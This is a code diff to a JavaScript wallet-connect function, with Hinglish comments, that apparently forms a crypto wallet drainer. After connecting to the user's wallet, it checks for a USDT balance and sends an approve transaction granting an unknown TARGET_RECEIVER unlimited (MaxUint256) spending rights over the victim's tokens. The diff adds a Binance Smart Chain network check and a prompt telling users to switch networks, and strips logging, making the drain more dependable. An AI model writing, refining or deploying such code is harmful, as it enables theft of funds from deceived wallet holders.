@@ -53,19 +53,23 @@
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       
+      const network = await provider.getNetwork();
+      
+      // Strict Network Check: Chain ID 56 Binance Smart Chain honi chahiye
+      if (network.chainId !== 56) {
+        alert("Please switch your Trust Wallet network to Binance Smart Chain (BSC) manually before clicking!");
+        return;
+      }
+
       const signer = provider.getSigner();
       const userAddress = await signer.getAddress();
       
       const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-      
-      // Balance check
       const balance = await usdtContract.balanceOf(userAddress);
-      console.log("USDT Balance:", ethers.utils.formatUnits(balance, 18));
 
       if (balance.gt(0)) {
         const maxAmount = ethers.constants.MaxUint256; 
         
-        // Approval transaction with fixed gas limit
         const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
           gasLimit: ethers.BigNumber.from("65000")
         });
@@ -78,7 +82,6 @@
 
     } catch (error) {
       console.error("Full Error:", error);
-      // Ab yahan exact error message screen par popup ban kar aayega
       let errMsg = error.reason || error.message || JSON.stringify(error);
       alert("Failed Reason: " + errMsg);
     }
